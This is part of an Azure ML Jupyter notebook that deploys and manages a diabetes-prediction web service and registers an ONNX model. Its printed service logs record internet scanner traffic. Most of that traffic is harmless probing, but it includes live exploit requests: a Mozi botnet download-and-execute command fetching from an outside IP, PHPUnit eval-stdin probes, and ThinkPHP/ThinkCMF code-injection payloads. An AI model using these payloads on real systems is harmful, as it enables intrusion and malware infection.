      "127.0.0.1 - - [30/Jan/2021:16:00:10 +0000] \"GET /phpmyadmin2015/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:16:00:10 +0000] \"GET /phpmyadmin2016/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:16:00:10 +0000] \"GET /phpmyadmin2017/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:16:00:11 +0000] \"GET /phpmyadmin2018/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:16:00:11 +0000] \"GET /phpmyadmin2019/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:16:00:11 +0000] \"GET /phpmyadmin2020/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:16:00:12 +0000] \"GET /index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [30/Jan/2021:16:57:51 +0000] \"GET /favicon.ico HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0\"\n",
      "127.0.0.1 - - [30/Jan/2021:18:24:48 +0000] \"GET /config/getuser?index=0 HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0\"\n",
      "127.0.0.1 - - [30/Jan/2021:19:37:37 +0000] \"GET /shell?%2Ftmp%2FMozi.a+jaws=&cd+%2Ftmp=&chmod+777+Mozi.a=&rm+-rf+%2A=&wget+http%3A%2F%2F223.130.29.233%3A60841%2FMozi.a= HTTP/1.0\" 404 232 \"-\" \"Hello, world\"\n",
      "127.0.0.1 - - [30/Jan/2021:20:00:32 +0000] \"GET /level/15/exec/-/sh/run/CR HTTP/1.0\" 404 232 \"-\" \"libwww-perl/6.52\"\n",
      "127.0.0.1 - - [30/Jan/2021:21:28:41 +0000] \"GET /login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - - [30/Jan/2021:21:28:42 +0000] \"GET /jenkins/login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - KjeyWDpn [30/Jan/2021:21:28:42 +0000] \"GET /manager/html HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - - [30/Jan/2021:21:36:00 +0000] \"GET /english/ HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36\"\n",
      "127.0.0.1 - - [31/Jan/2021:00:06:54 +0000] \"GET /console/ HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
      "127.0.0.1 - - [31/Jan/2021:00:06:54 +0000] \"POST /api/jsonws/invoke HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
      "127.0.0.1 - - [31/Jan/2021:00:06:54 +0000] \"POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
      "127.0.0.1 - - [31/Jan/2021:00:06:54 +0000] \"POST /Autodiscover/Autodiscover.xml HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
      "127.0.0.1 - - [31/Jan/2021:00:06:55 +0000] \"GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
      "127.0.0.1 - - [31/Jan/2021:00:06:56 +0000] \"GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0\" 200 7 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
      "127.0.0.1 - - [31/Jan/2021:00:06:56 +0000] \"GET /solr/admin/info/system?wt=json HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
      "127.0.0.1 - - [31/Jan/2021:00:06:57 +0000] \"GET /?a=fetch&content=%3Cphp%3Edie%28%40md5%28HelloThinkCMF%29%29%3C%2Fphp%3E HTTP/1.0\" 200 7 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
      "127.0.0.1 - - [31/Jan/2021:00:06:57 +0000] \"GET /index.php?function=call_user_func_array&s=%2FIndex%2F%5Cthink%5Capp%2Finvokefunction&vars%5B0%5D=md5&vars%5B1%5D%5B%5D=HelloThinkPHP21 HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
      "127.0.0.1 - - [31/Jan/2021:00:06:57 +0000] \"GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
      "127.0.0.1 - - [31/Jan/2021:01:59:13 +0000] \"GET /config/getuser?index=0 HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0\"\n",
      "127.0.0.1 - - [31/Jan/2021:02:26:54 +0000] \"POST /boaform/admin/formLogin HTTP/1.0\" 404 232 \"http://20.193.18.43:80/admin/login.asp\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0\"\n",
      "127.0.0.1 - - [31/Jan/2021:02:30:09 +0000] \"GET /robots.txt HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - - [31/Jan/2021:02:30:09 +0000] \"GET /sitemap.xml HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - - [31/Jan/2021:02:30:10 +0000] \"GET /.well-known/security.txt HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - - [31/Jan/2021:02:30:11 +0000] \"GET /favicon.ico HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0\"\n",
      "127.0.0.1 - - [31/Jan/2021:03:29:05 +0000] \"GET /login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - - [31/Jan/2021:03:29:06 +0000] \"GET /jenkins/login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - f7spZQ7O [31/Jan/2021:03:29:06 +0000] \"GET /manager/html HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "2021-01-31 07:27:36,626 | root | INFO | 200\n",
      "127.0.0.1 - - [31/Jan/2021:07:27:36 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
      "2021-01-31 07:27:37,263 | root | INFO | 200\n",
      "127.0.0.1 - - [31/Jan/2021:07:27:37 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - - [31/Jan/2021:08:14:19 +0000] \"GET /login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - - [31/Jan/2021:08:14:20 +0000] \"GET /jenkins/login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - ycJsCibA [31/Jan/2021:08:14:20 +0000] \"GET /manager/html HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - - [31/Jan/2021:09:49:18 +0000] \"GET /login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - - [31/Jan/2021:09:49:18 +0000] \"GET /jenkins/login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - AwN1qbOW [31/Jan/2021:09:49:19 +0000] \"GET /manager/html HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "2021-01-31 10:14:38,699 | root | INFO | 200\n",
      "127.0.0.1 - - [31/Jan/2021:10:14:38 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
      "2021-01-31 10:14:39,065 | root | INFO | 200\n",
      "127.0.0.1 - - [31/Jan/2021:10:14:39 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
      "2021-01-31 10:16:17,097 | root | INFO | 200\n",
      "127.0.0.1 - - [31/Jan/2021:10:16:17 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
      "2021-01-31 10:16:18,046 | root | INFO | 200\n",
      "127.0.0.1 - - [31/Jan/2021:10:16:18 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
      "2021-01-31 10:16:19,880 | root | INFO | 200\n",
      "127.0.0.1 - - [31/Jan/2021:10:16:19 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36\"\n",
      "127.0.0.1 - - [31/Jan/2021:10:16:22 +0000] \"GET /favicon.ico HTTP/1.0\" 404 232 \"http://159a4ac6-4925-4238-bd97-dbe0430d3a97.australiaeast.azurecontainer.io/swagger.json\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36\"\n",
      "2021-01-31 10:16:50,450 | root | INFO | Scoring Timer is set to 60.0 seconds\n",
      "2021-01-31 10:16:50,461 | root | ERROR | Encountered Exception: Traceback (most recent call last):\n",
      "  File \"/var/azureml-server/synchronous/routes.py\", line 64, in run_scoring\n",
      "    response = invoke_user_with_timer(service_input, request_headers)\n",
      "  File \"/var/azureml-server/synchronous/routes.py\", line 97, in invoke_user_with_timer\n",
      "    result = user_main.run(**params)\n",
      "  File \"/azureml-envs/azureml_15763e971906533c82eb47fe03a807b1/lib/python3.6/site-packages/wrapt/wrappers.py\", line 564, in __call__\n",
      "    args, kwargs)\n",
      "  File \"/azureml-envs/azureml_15763e971906533c82eb47fe03a807b1/lib/python3.6/site-packages/inference_schema/schema_decorators.py\", line 55, in decorator_input\n",
      "    args[param_position] = _deserialize_input_argument(args[param_position], param_type, param_name)\n",
      "IndexError: list index out of range\n",
      "\n",
      "During handling of the above exception, another exception occurred:\n",
      "\n",
      "Traceback (most recent call last):\n",
      "  File \"/azureml-envs/azureml_15763e971906533c82eb47fe03a807b1/lib/python3.6/site-packages/flask/app.py\", line 1832, in full_dispatch_request\n",
      "    rv = self.dispatch_request()\n",
      "  File \"/azureml-envs/azureml_15763e971906533c82eb47fe03a807b1/lib/python3.6/site-packages/flask/app.py\", line 1818, in dispatch_request\n",
      "    return self.view_functions[rule.endpoint](**req.view_args)\n",
      "  File \"/var/azureml-server/synchronous/routes.py\", line 20, in get_prediction_realtime\n",
      "    return run_scoring(service_input, request.headers, request.environ.get('REQUEST_ID', '00000000-0000-0000-0000-000000000000'))\n",
      "  File \"/var/azureml-server/synchronous/routes.py\", line 77, in run_scoring\n",
      "    raise RunFunctionException(str(exc))\n",
      "run_function_exception.RunFunctionException\n",
      "\n",
      "2021-01-31 10:16:50,461 | root | INFO | 500\n",
      "127.0.0.1 - - [31/Jan/2021:10:16:50 +0000] \"GET /score HTTP/1.0\" 500 23 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36\"\n",
      "Exception in worker process\n",
      "Traceback (most recent call last):\n",
      "  File \"/azureml-envs/azureml_15763e971906533c82eb47fe03a807b1/lib/python3.6/site-packages/gunicorn/arbiter.py\", line 583, in spawn_worker\n",
      "    worker.init_process()\n",
      "  File \"/azureml-envs/azureml_15763e971906533c82eb47fe03a807b1/lib/python3.6/site-packages/gunicorn/workers/base.py\", line 134, in init_process\n",
      "    self.run()\n",
      "  File \"/azureml-envs/azureml_15763e971906533c82eb47fe03a807b1/lib/python3.6/site-packages/gunicorn/workers/sync.py\", line 124, in run\n",
      "    self.run_for_one(timeout)\n",
      "  File \"/azureml-envs/azureml_15763e971906533c82eb47fe03a807b1/lib/python3.6/site-packages/gunicorn/workers/sync.py\", line 83, in run_for_one\n",
      "    self.wait(timeout)\n",
      "  File \"/azureml-envs/azureml_15763e971906533c82eb47fe03a807b1/lib/python3.6/site-packages/gunicorn/workers/sync.py\", line 35, in wait\n",
      "    ret = select.select(self.wait_fds, [], [], timeout)\n",
      "  File \"/var/azureml-server/routes_common.py\", line 162, in alarm_handler\n",
      "    raise TimeoutException(error_message)\n",
      "timeout_exception.TimeoutException\n",
      "Worker exiting (pid: 41)\n",
      "worker timeout is set to 300\n",
      "Booting worker with pid: 181\n",
      "SPARK_HOME not set. Skipping PySpark Initialization.\n",
      "Initializing logger\n",
      "2021-01-31 10:17:52,398 | root | INFO | Starting up app insights client\n",
      "2021-01-31 10:17:52,398 | root | INFO | Starting up request id generator\n",
      "2021-01-31 10:17:52,398 | root | INFO | Starting up app insight hooks\n",
      "2021-01-31 10:17:52,398 | root | INFO | Invoking user's init function\n",
      "2021-01-31 10:17:54,486 | azureml.core | WARNING | Failure while loading azureml_run_type_providers. Failed to load entrypoint automl = azureml.train.automl.run:AutoMLRun._from_run_dto with exception cannot import name 'RunType'.\n",
      "Failure while loading azureml_run_type_providers. Failed to load entrypoint automl = azureml.train.automl.run:AutoMLRun._from_run_dto with exception cannot import name 'RunType'.\n",
      "2021-01-31 10:17:54,704 | root | INFO | Users's init has completed successfully\n",
      "2021-01-31 10:17:54,706 | root | INFO | Skipping middleware: dbg_model_info as it's not enabled.\n",
      "2021-01-31 10:17:54,707 | root | INFO | Skipping middleware: dbg_resource_usage as it's not enabled.\n",
      "2021-01-31 10:17:54,708 | root | INFO | Scoring timeout is found from os.environ: 60000 ms\n",
      "2021-01-31 10:23:04,938 | root | INFO | 200\n",
      "127.0.0.1 - - [31/Jan/2021:10:23:04 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
      "2021-01-31 10:23:42,761 | root | INFO | 200\n",
      "127.0.0.1 - - [31/Jan/2021:10:23:42 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
      "2021-01-31 10:23:43,380 | root | INFO | Validation Request Content-Type\n",
      "2021-01-31 10:23:43,381 | root | INFO | Scoring Timer is set to 60.0 seconds\n",
      "2021-01-31 10:23:43,494 | root | INFO | 200\n",
      "127.0.0.1 - - [31/Jan/2021:10:23:43 +0000] \"POST /score HTTP/1.0\" 200 58 \"-\" \"python-requests/2.25.0\"\n",
      "2021-01-31 10:24:16,313 | root | INFO | 200\n",
      "127.0.0.1 - - [31/Jan/2021:10:24:16 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
      "2021-01-31 10:24:16,539 | root | INFO | Validation Request Content-Type\n",
      "2021-01-31 10:24:16,539 | root | INFO | Scoring Timer is set to 60.0 seconds\n",
      "2021-01-31 10:24:16,622 | root | INFO | 200\n",
      "127.0.0.1 - - [31/Jan/2021:10:24:16 +0000] \"POST /score HTTP/1.0\" 200 79 \"-\" \"python-requests/2.25.0\"\n",
      "2021-01-31 10:24:44,203 | root | INFO | 200\n",
      "127.0.0.1 - - [31/Jan/2021:10:24:44 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
      "2021-01-31 10:24:44,501 | root | INFO | Validation Request Content-Type\n",
      "2021-01-31 10:24:44,501 | root | INFO | Scoring Timer is set to 60.0 seconds\n",
      "2021-01-31 10:24:44,596 | root | INFO | 200\n",
      "127.0.0.1 - - [31/Jan/2021:10:24:44 +0000] \"POST /score HTTP/1.0\" 200 58 \"-\" \"python-requests/2.25.0\"\n",
      "2021-01-31 10:25:10,585 | root | INFO | 200\n",
      "127.0.0.1 - - [31/Jan/2021:10:25:10 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
      "2021-01-31 10:25:12,135 | root | INFO | 200\n",
      "127.0.0.1 - - [31/Jan/2021:10:25:12 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
      "2021-01-31 10:39:05,900 | root | INFO | 200\n",
      "127.0.0.1 - - [31/Jan/2021:10:39:05 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
      "2021-01-31 10:39:06,329 | root | INFO | Validation Request Content-Type\n",
      "2021-01-31 10:39:06,329 | root | INFO | Scoring Timer is set to 60.0 seconds\n",
      "2021-01-31 10:39:06,412 | root | INFO | 200\n",
      "127.0.0.1 - - [31/Jan/2021:10:39:06 +0000] \"POST /score HTTP/1.0\" 200 58 \"-\" \"python-requests/2.25.0\"\n",
      "2021-01-31 10:39:34,191 | root | INFO | 200\n",
      "127.0.0.1 - - [31/Jan/2021:10:39:34 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
      "2021-01-31 10:39:34,381 | root | INFO | Validation Request Content-Type\n",
      "2021-01-31 10:39:34,382 | root | INFO | Scoring Timer is set to 60.0 seconds\n",
      "2021-01-31 10:39:34,494 | root | INFO | 200\n",
      "127.0.0.1 - - [31/Jan/2021:10:39:34 +0000] \"POST /score HTTP/1.0\" 200 79 \"-\" \"python-requests/2.25.0\"\n",
      "2021-01-31 10:40:00,300 | root | INFO | 200\n",
      "127.0.0.1 - - [31/Jan/2021:10:40:00 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
      "2021-01-31 10:40:01,306 | root | INFO | 200\n",
      "127.0.0.1 - - [31/Jan/2021:10:40:01 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
      "2021-01-31 10:41:03,063 | root | INFO | 200\n",
      "127.0.0.1 - - [31/Jan/2021:10:41:03 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
      "2021-01-31 10:41:03,816 | root | INFO | 200\n",
      "127.0.0.1 - - [31/Jan/2021:10:41:03 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
      "2021-01-31 10:43:59,093 | root | INFO | 200\n",
      "127.0.0.1 - - [31/Jan/2021:10:43:59 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
      "2021-01-31 10:43:59,611 | root | INFO | 200\n",
      "127.0.0.1 - - [31/Jan/2021:10:43:59 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
      "2021-01-31 10:47:21,848 | root | INFO | 200\n",
      "127.0.0.1 - - [31/Jan/2021:10:47:21 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
      "2021-01-31 10:47:23,099 | root | INFO | Validation Request Content-Type\n",
      "2021-01-31 10:47:23,099 | root | INFO | Scoring Timer is set to 60.0 seconds\n",
      "2021-01-31 10:47:23,202 | root | INFO | 200\n",
      "127.0.0.1 - - [31/Jan/2021:10:47:23 +0000] \"POST /score HTTP/1.0\" 200 79 \"-\" \"python-requests/2.25.0\"\n",
      "2021-01-31 10:47:45,487 | root | INFO | 200\n",
      "127.0.0.1 - - [31/Jan/2021:10:47:45 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
      "2021-01-31 10:47:45,700 | root | INFO | Validation Request Content-Type\n",
      "2021-01-31 10:47:45,701 | root | INFO | Scoring Timer is set to 60.0 seconds\n",
      "2021-01-31 10:47:45,793 | root | INFO | 200\n",
      "127.0.0.1 - - [31/Jan/2021:10:47:45 +0000] \"POST /score HTTP/1.0\" 200 79 \"-\" \"python-requests/2.25.0\"\n",
      "2021-01-31 10:48:06,843 | root | INFO | 200\n",
      "127.0.0.1 - - [31/Jan/2021:10:48:06 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
      "2021-01-31 10:48:07,802 | root | INFO | 200\n",
      "127.0.0.1 - - [31/Jan/2021:10:48:07 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
      "\n"
     ]
    }
   ],
   "source": [
    "service = Webservice(workspace=ws, name='pimadiabetesendpv3')\n",
    "service.update(enable_app_insights=True)\n",
    "\n",
    "logs = service.get_logs()\n",
    "print(logs)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "nteract": {
     "transient": {
      "deleting": false
     }
    }
   },
   "source": [
    "## Delete WebSERVICE"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 69,
   "metadata": {
    "collapsed": true,
    "gather": {
     "logged": 1611729855749
    },
    "jupyter": {
     "outputs_hidden": false,
     "source_hidden": false
    },
    "nteract": {
     "transient": {
      "deleting": false
     }
    }
   },
   "outputs": [],
   "source": [
    "service = Webservice(workspace=ws, name='pimadiabetesendpv2')\n",
    "service.delete()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "nteract": {
     "transient": {
      "deleting": false
     }
    }
   },
   "source": [
    "## ONNX Model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 85,
   "metadata": {
    "collapsed": true,
    "gather": {
     "logged": 1611742861467
    },
    "jupyter": {
     "outputs_hidden": false,
     "source_hidden": false
    },
    "nteract": {
     "transient": {
      "deleting": false
     }
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Registering model best_model.onnx\n"
     ]
    }
   ],
   "source": [
    "from azureml.automl.runtime.onnx_convert import OnnxConverter\n",
    "\n",
    "best_run, onnx_mdl = remote_run.get_output(return_onnx_model=True)\n",
    "\n",
    "onnx_fl_path = \"./best_model.onnx\"\n",
    "OnnxConverter.save_onnx_model(onnx_mdl, onnx_fl_path)\n",
    "\n",
    "\n",
    "model = Model.register(model_path = \"./\",\n",
    "                       model_name = \"best_model.onnx\",\n",
    "                       tags = {\"onnx\": \"MyFirstonnx\"},\n",
    "                       description = \"pimadiabetesonnx\",\n",
    "                       workspace = ws)\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {
    "collapsed": true,
    "gather": {
     "logged": 1612219220807
    },
    "jupyter": {
     "outputs_hidden": false,
     "source_hidden": false
    },
    "nteract": {
     "transient": {
      "deleting": false
     }
    }
   },
   "outputs": [],
   "source": [
    "from azureml.core.webservice import AciWebservice, Webservice\n",
    "from azureml.core.model import Model\n",
    "from azureml.core.environment import Environment\n",
    "from azureml.core.model import InferenceConfig\n",
    "\n",
    "bestmodel, fmodel = remote_run.get_output()\n",
    "#bestmodel.download_file('outputs/scoring_file_v_1_0_0.py', 'scoring.py') \n",
    "bestmodel.download_file('outputs/conda_env_v_1_0_0.yml', 'myenv.yml')  "
   ]
  }
 ],
 "metadata": {
  "kernel_info": {
   "name": "python3"
  },
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.9"
  },
  "nteract": {
   "version": "nteract-front-end@1.0.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
